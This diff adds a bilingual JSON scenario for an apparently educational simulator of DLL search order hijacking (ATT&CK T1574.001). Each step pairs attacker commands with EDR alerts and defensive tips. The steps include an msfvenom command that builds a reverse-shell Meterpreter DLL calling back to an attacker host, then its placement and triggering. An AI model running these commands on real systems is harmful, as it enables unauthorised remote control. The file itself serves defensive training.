@@ -1,0 +1,230 @@
+{
+  "id": "T1574.001",
+  "title": "DLL 검색 순서 하이재킹 시뮬레이션",
+  "titleEn": "DLL Search Order Hijacking Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚡" },
+    { "label": "침투", "labelEn": "Breach", "icon": "🔓" },
+    { "label": "완료", "labelEn": "Complete", "icon": "✅" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 80, "y": 150, "type": "attacker" },
+    { "id": "target", "label": "VulnApp Host", "x": 280, "y": 150, "type": "server" },
+    { "id": "c2", "label": "C2 Server", "x": 280, "y": 50, "type": "attacker" },
+    { "id": "siem", "label": "SIEM/EDR", "x": 480, "y": 150, "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "target", "label": "Recon", "activeStep": 0 },
+    { "from": "attacker", "to": "target", "label": "DLL Drop", "activeStep": 4 },
+    { "from": "target", "to": "c2", "label": "Reverse Shell", "activeStep": 5 },
+    { "from": "target", "to": "siem", "label": "Alert", "activeStep": 5 }
+  ],
+  "desktopIcons": [
+    { "label": "ProcMon", "icon": "🔍", "alertOnStep": 0 },
+    { "label": "msfvenom", "icon": "🗂️", "alertOnStep": 3 },
+    { "label": "Meterpreter", "icon": "💻", "alertOnStep": 6 }
+  ],
+  "steps": [
+    {
+      "cmd": "procmon.exe /AcceptEula /BackingFile C:\\Temp\\procmon.pml",
+      "out": "Process Monitor v3.96 - Sysinternals\nCopyright (C) 2023 Mark Russinovich\nLogging to: C:\\Temp\\procmon.pml\nFilter: Operation=CreateFile, Result=NAME NOT FOUND, Path contains .dll",
+      "def": "[EDR] Process Monitor launched by {userName} - monitoring DLL load activity",
+      "defAction": "Process: procmon.exe (PID: 2840)\nUser: {companyName}\\{userName}\nRisk Level: Low\nAction: Log - legitimate sysadmin tool",
+      "desc": "공격자가 Process Monitor를 사용하여 DLL 로드 실패(NAME NOT FOUND)를 모니터링합니다. 하이재킹 가능한 DLL을 식별하기 위한 정찰 단계입니다.",
+      "descEn": "The attacker uses Process Monitor to monitor DLL load failures (NAME NOT FOUND). This is reconnaissance to identify hijackable DLLs.",
+      "stepTitle": "DLL 로드 모니터링",
+      "stepTitleEn": "DLL Load Monitoring",
+      "feynman": "레스토랑에서 손님이 '메뉴에 없는 요리'를 주문하는 상황을 지켜보는 것과 같습니다. 프로그램이 특정 DLL을 찾지만 실패하는 순간을 포착하면, 공격자가 그 자리에 가짜 DLL을 넣어둘 수 있습니다.",
+      "feynmanEn": "It's like watching a restaurant where diners order dishes not on the menu. When a program looks for a specific DLL but fails, the attacker can place a fake DLL in that spot.",
+      "expert": "Process Monitor의 CreateFile 필터에서 NAME NOT FOUND 결과를 분석하면 DLL Side-Loading 취약점을 발견할 수 있습니다. Windows DLL 검색 순서는 1)알려진 DLL 목록 2)실행 파일 디렉토리 3)System32 4)Windows 5)현재 디렉토리 6)PATH 순입니다. SafeDllSearchMode 레지스트리 설정이 이 순서에 영향을 줍니다.",
+      "expertEn": "Analyzing CreateFile filters in Process Monitor for NAME NOT FOUND results reveals DLL Side-Loading vulnerabilities. Windows DLL search order: 1)Known DLLs list 2)Application directory 3)System32 4)Windows 5)Current directory 6)PATH. SafeDllSearchMode registry setting affects this order.",
+      "defTooltip": "Sysmon Event ID 7(이미지 로드)에서 서명되지 않은 DLL 로드를 모니터링하세요. 애플리케이션 디렉토리에서 로드되는 시스템 DLL 이름의 파일은 하이재킹 가능성이 높습니다.",
+      "defTooltipEn": "Monitor Sysmon Event ID 7 (Image Load) for unsigned DLL loads. Files with system DLL names loaded from application directories are highly suspicious for hijacking.",
+      "hackerLog": {
+        "title": "procmon_recon.log",
+        "lines": [
+          { "log": "Filter: Operation=CreateFile, Result=NAME NOT FOUND", "desc": "💡 DLL 로드 실패만 필터링하여 하이재킹 가능한 DLL을 찾습니다" },
+          { "log": "Logging to: C:\\Temp\\procmon.pml", "desc": "💡 모니터링 결과를 파일로 저장하여 나중에 분석합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Process Monitor", "desc": "실시간 파일 시스템, 레지스트리, 프로세스 활동을 모니터링하는 Sysinternals 도구입니다" },
+        { "term": "DLL Search Order", "desc": "Windows가 DLL을 찾을 때 사용하는 디렉토리 검색 순서로, 이 순서의 취약점을 악용할 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "procmon.exe /OpenLog C:\\Temp\\procmon.pml | findstr /i \"NAME NOT FOUND\" | findstr /i \".dll\"",
+      "out": "notepad.exe    CreateFile    C:\\Users\\{userName}\\Desktop\\version.dll    NAME NOT FOUND\nnotepad.exe    CreateFile    C:\\Users\\{userName}\\Desktop\\dwmapi.dll     NAME NOT FOUND\nslack.exe      CreateFile    C:\\Users\\{userName}\\AppData\\userenv.dll    NAME NOT FOUND\nteams.exe      CreateFile    C:\\Program Files\\Teams\\msi.dll            NAME NOT FOUND",
+      "def": "[SIEM] DLL search order analysis detected - potential DLL hijacking reconnaissance",
+      "defAction": "User: {companyName}\\{userName}\nTool: Process Monitor\nPattern: Searching for missing DLL paths\nRisk Level: Medium\nAction: Alert analyst",
+      "desc": "DLL 로드에 실패한 경로를 분석합니다. 현재 사용자가 쓰기 권한을 가진 경로에서 DLL을 찾는 프로그램이 하이재킹 대상입니다.",
+      "descEn": "Analyzes paths where DLL loading failed. Programs that search for DLLs in paths writable by the current user are hijacking targets.",
+      "stepTitle": "하이재킹 대상 분석",
+      "stepTitleEn": "Hijacking Target Analysis",
+      "feynman": "택배 기사가 빈 사물함을 찾아다니는 것과 같습니다. 프로그램들이 DLL을 찾다가 '없습니다'라는 결과를 받으면, 공격자는 그 빈 자리에 자신의 악성 DLL을 넣어둘 수 있습니다. 사용자가 쓰기 권한이 있는 폴더가 핵심 타겟입니다.",
+      "feynmanEn": "It's like a delivery person finding empty lockers. When programs search for DLLs and get 'not found', the attacker can place their malicious DLL in that empty slot. Folders where the user has write permission are key targets.",
+      "expert": "NAME NOT FOUND 결과 중 사용자 쓰기 가능 경로를 필터링하는 것이 핵심입니다. version.dll, dwmapi.dll 등은 자주 하이재킹되는 DLL입니다. CWE-427(Uncontrolled Search Path Element)과 관련되며, 애플리케이션 개발자가 DLL을 절대 경로로 로드하면 방지됩니다.",
+      "expertEn": "Filtering NAME NOT FOUND results for user-writable paths is the key. version.dll, dwmapi.dll are commonly hijacked DLLs. Related to CWE-427 (Uncontrolled Search Path Element), preventable when developers load DLLs using absolute paths.",
+      "defTooltip": "EDR에서 Process Monitor 실행과 함께 DLL 관련 파일 시스템 이벤트를 상관분석하세요. 짧은 시간 내 다수의 NAME NOT FOUND 이벤트는 정찰 활동의 지표입니다.",
+      "defTooltipEn": "Correlate Process Monitor execution with DLL-related file system events in EDR. Multiple NAME NOT FOUND events in a short time indicate reconnaissance activity.",
+      "hackerLog": {
+        "title": "dll_analysis.log",
+        "lines": [
+          { "log": "notepad.exe  CreateFile  C:\\Users\\...\\version.dll  NAME NOT FOUND", "desc": "💡 notepad.exe가 사용자 디렉토리에서 version.dll을 찾으려 했으나 실패했습니다" },
+          { "log": "teams.exe  CreateFile  C:\\Program Files\\Teams\\msi.dll  NAME NOT FOUND", "desc": "💡 Teams 앱이 msi.dll을 찾지 못했습니다 - 쓰기 권한이 있다면 하이재킹 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "NAME NOT FOUND", "desc": "파일 시스템에서 요청한 파일이 존재하지 않을 때 반환되는 결과로, DLL 하이재킹의 기회를 나타냅니다" },
+        { "term": "DLL Hijacking", "desc": "프로그램이 찾는 DLL 경로에 악성 DLL을 배치하여 코드를 실행시키는 공격 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "icacls \"C:\\Program Files\\VulnApp\\\"",
+      "out": "C:\\Program Files\\VulnApp\\ {companyName}\\{userName}:(OI)(CI)(M)\n                           BUILTIN\\Users:(OI)(CI)(RX)\n                           NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                           BUILTIN\\Administrators:(OI)(CI)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files",
+      "def": "[EDR] Permission check on application directory by {userName}",
+      "defAction": "Process: icacls.exe\nTarget: C:\\Program Files\\VulnApp\\\nResult: User has Modify (M) permission\nRisk Level: Medium\nAction: Flag weak ACL configuration",
+      "desc": "대상 애플리케이션 디렉터리의 권한을 확인합니다. 사용자에게 수정(M) 권한이 있어 악성 DLL을 배치할 수 있습니다.",
+      "descEn": "Checks permissions on the target application directory. The user has Modify (M) permission, allowing placement of a malicious DLL.",
+      "stepTitle": "폴더 권한 확인",
+      "stepTitleEn": "Folder Permission Check",
+      "feynman": "건물의 어떤 방에 자물쇠가 없는지 확인하는 것과 같습니다. 'Modify' 권한은 그 폴더에 새 파일을 넣을 수 있다는 뜻입니다. Program Files 폴더에 일반 사용자가 쓰기 권한을 갖는 것은 보안 설정 오류입니다.",
+      "feynmanEn": "It's like checking which rooms in a building have no locks. 'Modify' permission means you can place new files in that folder. A regular user having write access to Program Files is a security misconfiguration.",
+      "expert": "DACL(Discretionary Access Control List)에서 (OI)(CI)(M)은 Object Inherit + Container Inherit + Modify를 의미합니다. Program Files 디렉토리에 일반 사용자의 쓰기 권한은 CIS Benchmark 위반입니다. AccessChk, icacls 도구로 주기적 권한 감사를 수행해야 합니다.",
+      "expertEn": "In DACL, (OI)(CI)(M) means Object Inherit + Container Inherit + Modify. Write permissions for regular users on Program Files directories violates CIS Benchmark. Periodic permission audits should be performed using AccessChk and icacls.",
+      "defTooltip": "Windows Security Event ID 4663(개체 접근 시도)에서 Program Files 하위 디렉토리에 대한 쓰기 접근을 모니터링하세요. 주기적으로 icacls를 사용하여 비정상 ACL을 감사합니다.",
+      "defTooltipEn": "Monitor Windows Security Event ID 4663 (Object Access Attempt) for write access to Program Files subdirectories. Periodically audit abnormal ACLs using icacls.",
+      "hackerLog": {
+        "title": "acl_check.log",
+        "lines": [
+          { "log": "icacls \"C:\\Program Files\\VulnApp\\\"", "desc": "💡 대상 애플리케이션 폴더의 접근 권한을 확인합니다" },
+          { "log": "{companyName}\\{userName}:(OI)(CI)(M)", "desc": "💡 일반 사용자에게 수정(Modify) 권한이 있어 파일 생성이 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "ACL (Access Control List)", "desc": "파일이나 폴더에 누가 어떤 권한으로 접근할 수 있는지 정의하는 보안 목록입니다" },
+        { "term": "Modify (M) Permission", "desc": "파일/폴더를 읽고, 쓰고, 수정하고, 삭제할 수 있는 Windows 파일 시스템 권한입니다" }
+      ]
+    },
+    {
+      "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.50 LPORT=4443 -f dll -o version.dll",
+      "out": "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 8704 bytes\nSaved as: version.dll",
+      "def": "[EDR] CRITICAL: msfvenom execution detected - malware generation tool",
+      "defAction": "Process: msfvenom (PID: 4501)\nOutput: version.dll (8704 bytes)\nPayload: windows/x64/meterpreter/reverse_tcp\nCallback: 10.0.0.50:4443\nRisk Level: Critical\nAction: QUARANTINE file, block network to 10.0.0.50",
+      "desc": "Metasploit의 msfvenom으로 리버스 쉘 페이로드를 DLL 형식으로 생성합니다. 실제 DLL과 동일한 이름(version.dll)을 사용합니다.",
+      "descEn": "Generates a reverse shell payload in DLL format using Metasploit's msfvenom. Uses the same name (version.dll) as the legitimate DLL.",
+      "stepTitle": "악성 DLL 생성",
+      "stepTitleEn": "Malicious DLL Creation",
+      "feynman": "진짜 약과 똑같이 생긴 가짜 약을 만드는 것과 같습니다. 공격자는 프로그램이 찾는 version.dll과 동일한 이름의 파일을 만들지만, 내부에는 '원격 조종 프로그램'이 숨어 있습니다.",
+      "feynmanEn": "It's like making counterfeit medicine that looks identical to the real thing. The attacker creates a file with the same name (version.dll) that the program is looking for, but inside hides a 'remote control program'.",
+      "expert": "msfvenom은 Metasploit Framework의 페이로드 생성 도구입니다. reverse_tcp 페이로드는 스테이저(stager) 방식으로 동작하며, 초기 연결 후 전체 Meterpreter 스테이지를 다운로드합니다. 탐지를 위해 YARA 규칙에서 msfvenom 생성 DLL의 시그니처(MZ 헤더 + 특정 임포트 패턴)를 분석해야 합니다.",
+      "expertEn": "msfvenom is Metasploit Framework's payload generation tool. The reverse_tcp payload operates as a stager, downloading the full Meterpreter stage after initial connection. For detection, YARA rules should analyze msfvenom-generated DLL signatures (MZ header + specific import patterns).",
+      "defTooltip": "EDR에서 msfvenom 프로세스 이름이나 Metasploit 관련 커맨드라인 패턴을 탐지 규칙으로 설정하세요. 또한 AMSI(Antimalware Scan Interface)가 활성화되어 있으면 페이로드 생성 시점에 차단이 가능합니다.",
+      "defTooltipEn": "Set EDR detection rules for msfvenom process names or Metasploit-related command-line patterns. AMSI (Antimalware Scan Interface) can block payload generation when enabled.",
+      "hackerLog": {
+        "title": "payload_gen.log",
+        "lines": [
+          { "log": "msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll -o version.dll", "desc": "💡 리버스 쉘 페이로드를 DLL 형식으로 생성합니다" },
+          { "log": "Final size of dll file: 8704 bytes", "desc": "💡 8.5KB 크기의 악성 DLL이 생성되었습니다 - 정상 version.dll과 크기 차이가 있습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "msfvenom", "desc": "Metasploit Framework에서 다양한 형식의 악성 페이로드를 생성하는 도구입니다" },
+        { "term": "Reverse Shell", "desc": "공격 대상이 공격자에게 역으로 연결을 시도하는 쉘로, 방화벽 인바운드 차단을 우회합니다" }
+      ]
+    },
+    {
+      "cmd": "copy version.dll \"C:\\Program Files\\VulnApp\\version.dll\"",
+      "out": "        1 file(s) copied.",
+      "def": "[EDR] ALERT: Suspicious DLL placed in application directory",
+      "defAction": "File: C:\\Program Files\\VulnApp\\version.dll\nHash: a3f2b8c1d4e5f6789012345678abcdef\nSigner: UNSIGNED\nOriginal: Microsoft signed\nRisk Level: Critical\nAction: File quarantined, hash added to blocklist",
+      "desc": "생성한 악성 DLL을 취약한 애플리케이션 디렉터리에 복사합니다. 애플리케이션 실행 시 정상 DLL 대신 이 파일이 로드됩니다.",
+      "descEn": "Copies the malicious DLL to the vulnerable application directory. When the application runs, this file will be loaded instead of the legitimate DLL.",
+      "stepTitle": "악성 DLL 배치",
+      "stepTitleEn": "Malicious DLL Placement",
+      "feynman": "진짜 약 대신 가짜 약을 약국 선반에 올려놓는 것과 같습니다. 다음에 누군가 약을 집으면 진짜가 아닌 가짜를 가져가게 됩니다. DLL 검색 순서 때문에 앱 폴더의 DLL이 시스템 폴더의 정상 DLL보다 먼저 로드됩니다.",
+      "feynmanEn": "It's like placing fake medicine on the pharmacy shelf instead of real medicine. Next time someone reaches for it, they'll grab the fake. Due to DLL search order, the app folder's DLL loads before the legitimate one in the system folder.",
+      "expert": "DLL 배치 단계에서 EDR의 파일 무결성 모니터링(FIM)이 핵심 방어 수단입니다. 서명되지 않은 DLL이 애플리케이션 디렉토리에 생성될 때 실시간 알림을 발생시켜야 합니다. Windows Defender Application Control(WDAC)이나 AppLocker의 DLL 규칙으로 서명된 DLL만 로드를 허용할 수 있습니다.",
+      "expertEn": "At the DLL placement stage, EDR's File Integrity Monitoring (FIM) is the key defense. Real-time alerts should trigger when unsigned DLLs are created in application directories. WDAC or AppLocker DLL rules can restrict loading to signed DLLs only.",
+      "defTooltip": "Sysmon Event ID 11(파일 생성)에서 Program Files 하위에 생성되는 DLL 파일을 모니터링하세요. 특히 서명 여부를 확인하는 것이 중요합니다.",
+      "defTooltipEn": "Monitor Sysmon Event ID 11 (File Creation) for DLL files created under Program Files. Checking digital signatures is particularly important.",
+      "hackerLog": {
+        "title": "dll_placement.log",
+        "lines": [
+          { "log": "copy version.dll \"C:\\Program Files\\VulnApp\\version.dll\"", "desc": "💡 악성 DLL을 앱 디렉토리에 복사하여 하이재킹을 준비합니다" },
+          { "log": "1 file(s) copied.", "desc": "💡 악성 DLL이 성공적으로 배치되었습니다 - 앱 실행 시 자동 로드됩니다" }
+        ]
+      },
+      "terms": [
+        { "term": "DLL Side-Loading", "desc": "합법적 애플리케이션이 악성 DLL을 로드하도록 유도하는 공격 기법입니다" },
+        { "term": "Code Signing", "desc": "소프트웨어의 출처와 무결성을 보증하는 디지털 서명으로, 서명되지 않은 DLL은 위험 신호입니다" }
+      ]
+    },
+    {
+      "cmd": "\"C:\\Program Files\\VulnApp\\VulnApp.exe\"",
+      "out": "[VulnApp.exe starting...]\n[Loading version.dll from C:\\Program Files\\VulnApp\\version.dll]\n[DLL loaded successfully]\n[Application running normally]\n\n--- Attacker's listener ---\n[*] Meterpreter session 1 opened (10.0.0.50:4443 -> 192.168.1.105:52341)",
+      "def": "[EDR] CRITICAL: Unsigned DLL loaded by VulnApp.exe - reverse connection established",
+      "defAction": "Process: VulnApp.exe -> version.dll (UNSIGNED)\nNetwork: Outbound connection to 10.0.0.50:4443\nRisk Level: Critical\nAction: KILL PROCESS, block IP 10.0.0.50, isolate host",
+      "desc": "취약한 애플리케이션을 실행하면 DLL 검색 순서에 따라 애플리케이션 디렉터리의 악성 DLL이 먼저 로드되어 리버스 쉘이 연결됩니다.",
+      "descEn": "When the vulnerable application runs, the malicious DLL in the application directory is loaded first according to DLL search order, establishing a reverse shell.",
+      "stepTitle": "DLL 하이재킹 실행",
+      "stepTitleEn": "DLL Hijacking Triggered",
+      "feynman": "손님이 레스토랑 문을 여는 순간 자동으로 알람이 울리는 것과 같습니다. 정상적인 프로그램(VulnApp.exe)이 실행되면서 악성 DLL을 '진짜'로 착각하고 로드합니다. 사용자에게는 앱이 정상적으로 실행되는 것처럼 보이지만, 뒤에서는 공격자에게 원격 접속이 열립니다.",
+      "feynmanEn": "It's like an alarm going off automatically when a customer opens the restaurant door. The legitimate program (VulnApp.exe) mistakes the malicious DLL for the real one and loads it. The app appears normal to the user, but a remote connection opens to the attacker behind the scenes.",
+      "expert": "DLL 검색 순서에서 애플리케이션 디렉토리가 System32보다 우선하므로, 공격자의 version.dll이 정상 version.dll보다 먼저 로드됩니다. 이 기법은 APT 그룹(APT41, Lazarus)이 자주 사용하며, CVE가 할당되지 않는 설계적 취약점입니다. DLL 프록시(DLL Forwarding)를 사용하면 원래 기능도 유지할 수 있습니다.",
+      "expertEn": "In DLL search order, the application directory takes precedence over System32, so the attacker's version.dll loads before the legitimate one. This technique is frequently used by APT groups (APT41, Lazarus) and is a design vulnerability without assigned CVEs. DLL proxying (DLL Forwarding) can maintain original functionality.",
+      "defTooltip": "Sysmon Event ID 7(이미지 로드)에서 서명되지 않은 DLL이 서명된 애플리케이션에 의해 로드되는 패턴을 탐지하세요. Event ID 3(네트워크 연결)과의 상관분석으로 DLL 로드 직후 외부 연결을 확인합니다.",
+      "defTooltipEn": "Detect patterns in Sysmon Event ID 7 (Image Load) where unsigned DLLs are loaded by signed applications. Correlate with Event ID 3 (Network Connection) to identify outbound connections immediately after DLL load.",
+      "hackerLog": {
+        "title": "hijack_trigger.log",
+        "lines": [
+          { "log": "Loading version.dll from C:\\Program Files\\VulnApp\\version.dll", "desc": "💡 앱이 시스템 디렉토리 대신 앱 디렉토리에서 악성 DLL을 먼저 로드합니다" },
+          { "log": "Meterpreter session 1 opened (10.0.0.50:4443 -> 192.168.1.105:52341)", "desc": "💡 악성 DLL 실행으로 공격자에게 원격 제어 세션이 연결되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "DLL Search Order Hijacking", "desc": "Windows의 DLL 검색 순서를 악용하여 정상 DLL 대신 악성 DLL을 로드시키는 공격입니다" },
+        { "term": "Meterpreter Session", "desc": "Metasploit의 원격 제어 세션으로, 파일 접근, 명령 실행, 스크린 캡처 등이 가능합니다" }
+      ]
+    },
+    {
+      "cmd": "meterpreter> getuid && sysinfo",
+      "out": "Server username: {companyName}\\{userName}\nComputer    : PC-{userName}\nOS          : Windows 10 (10.0 Build 19045)\nArchitecture: x64\nSystem Lang : ko_KR\nMeterpreter : x64/windows",
+      "def": "[SIEM] C2 beacon detected - Meterpreter session active from PC-{userName}",
+      "defAction": "C2 Server: 10.0.0.50:4443\nBeacon Interval: 5s\nSession Type: Meterpreter x64\nRisk Level: Critical\nAction: Incident declared - IR playbook activated",
+      "desc": "Meterpreter 세션을 통해 시스템 정보를 수집합니다. DLL 하이재킹으로 인해 VulnApp.exe의 권한으로 원격 제어가 가능합니다.",
+      "descEn": "Gathers system information through the Meterpreter session. Due to DLL hijacking, remote control is possible with VulnApp.exe's privileges.",
+      "stepTitle": "원격 제어 확인",
+      "stepTitleEn": "Remote Control Confirmed",
+      "feynman": "위조 열쇠로 건물에 들어간 후 건물 안내도를 보는 것과 같습니다. 공격자는 원격 세션에서 어떤 사용자로 로그인되어 있는지, 운영체제가 무엇인지 확인하여 다음 공격을 계획합니다.",
+      "feynmanEn": "It's like reading the building directory after entering with a forged key. The attacker checks which user they're logged in as and the operating system to plan the next attack.",
+      "expert": "DLL 하이재킹을 통해 획득한 Meterpreter 세션은 VulnApp.exe의 보안 컨텍스트에서 실행됩니다. 만약 VulnApp.exe가 높은 권한(SYSTEM, 관리자)으로 실행되면 추가 권한 상승 없이 시스템 장악이 가능합니다. 방어를 위해 AppLocker/WDAC에서 DLL 규칙을 활성화하고, 코드 서명 검증을 강제해야 합니다.",
+      "expertEn": "The Meterpreter session obtained through DLL hijacking runs in VulnApp.exe's security context. If VulnApp.exe runs with elevated privileges (SYSTEM, Administrator), system takeover is possible without additional privilege escalation. Enable DLL rules in AppLocker/WDAC and enforce code signature verification for defense.",
+      "defTooltip": "EDR에서 C2 비콘 패턴(주기적 외부 통신)을 탐지하세요. Sysmon Event ID 3에서 정상 애플리케이션이 비정상적인 외부 IP로 연결하는 패턴을 분석합니다.",
+      "defTooltipEn": "Detect C2 beacon patterns (periodic external communication) in EDR. Analyze patterns in Sysmon Event ID 3 where legitimate applications connect to abnormal external IPs.",
+      "hackerLog": {
+        "title": "c2_session.log",
+        "lines": [
+          { "log": "Server username: {companyName}\\{userName}", "desc": "💡 현재 세션이 VulnApp.exe를 실행한 사용자 권한으로 동작합니다" },
+          { "log": "Meterpreter : x64/windows", "desc": "💡 64비트 Windows용 Meterpreter가 활성화되어 완전한 원격 제어가 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "C2 Beacon", "desc": "악성코드가 주기적으로 명령 제어 서버에 연결하여 새 명령을 확인하는 통신 패턴입니다" },
+        { "term": "Security Context", "desc": "프로세스가 실행될 때 적용되는 사용자 권한과 접근 토큰의 집합입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "cmd.exe (PID: 1200)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "procmon.exe (PID: 2840)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "icacls.exe", "depth": 2, "alert": false, "minStep": 2 },
+    { "name": "msfvenom (PID: 4501)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "VulnApp.exe (PID: 5100)", "depth": 1, "alert": true, "minStep": 5 },
+    { "name": "version.dll (UNSIGNED, Hijacked)", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "meterpreter (Reverse Shell)", "depth": 3, "alert": true, "minStep": 6 }
+  ]
+}
